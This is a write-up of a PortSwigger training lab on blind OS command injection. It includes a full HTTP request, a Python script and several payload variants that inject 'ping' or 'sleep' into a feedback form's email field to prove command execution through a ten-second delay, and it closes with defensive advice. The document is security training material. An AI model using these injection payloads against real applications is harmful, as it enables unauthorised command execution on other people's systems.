# Lab: Blind OS command injection with time delays (Practitioner)

**PortSwigger:** [Official lab](https://portswigger.net/web-security/os-command-injection/lab-blind-time-delays)

**Description:** The feedback function runs a shell command containing the user-supplied details, but the command output is not returned in the response.

**Goal:** Exploit the blind injection to cause a 10 second delay.

**Vulnerable parameter:** `email` in `POST /feedback/submit`.

## Vulnerability

Submitted feedback is handed to a shell command (a mail-sending helper). Because the output is discarded, the injection is *blind* — the only observable side effect is the response time. A command that sleeps/pings for a known duration proves code execution.

## Solution

1. Open `/feedback` and grab the `csrf` token from the form.
2. Submit feedback normally once to measure the baseline response time (~1 s).
3. Submit again with the payload in the `email` field:

```http
POST /feedback/submit HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded

csrf=<token>&name=x&email=x||ping+-c+10+127.0.0.1||&subject=x&message=x
```

4. The response takes ~10 seconds to arrive → command execution confirmed, lab solved.

`||` is used so the second command runs when the first one fails; the trailing `||` neutralises the rest of the original command line.

## Exploit Payload

```
x||ping -c 10 127.0.0.1||
```

Alternatives: `x||sleep 10||`, `x;sleep 10;`, `x|ping -n 10 127.0.0.1|` (Windows targets).

## Python one-liner (optional)

```python
import re, time, requests
base = "https://YOUR-LAB-ID.web-security-academy.net"
s = requests.Session()
csrf = re.search(r'name="csrf" value="([^"]+)"', s.get(base + "/feedback").text).group(1)
t = time.time()
s.post(base + "/feedback/submit", data={"csrf": csrf, "name": "x",
       "email": "x||ping -c 10 127.0.0.1||", "subject": "x", "message": "x"})
print(f"{time.time() - t:.2f}s")
```

Full automation (baseline vs injected timing): [`os_command_injection_blind_time_delays.py`](os_command_injection_blind_time_delays.py).

## Verified run

Instance `0a8a00df045730f7804d9e0b001a006e`:

```
baseline = 0.97 s
injected = 9.99 s   -> lab solved
```

## Notes

- Always fetch a **fresh** `csrf` token per submission; reusing one can make the request fail before the command runs.
- The command runs asynchronously — the lab may flip to *Solved* a couple of seconds after the response.
- Use a delay you can distinguish from network jitter (10 s here); a 1-2 s delay is easy to misread.

## Defensive takeaways

Never build shell commands from form fields. Validate/normalise email addresses, invoke mail libraries directly, and treat unexpected latency spikes on write endpoints as a possible injection signal — timing controls are a detection aid, not a fix.
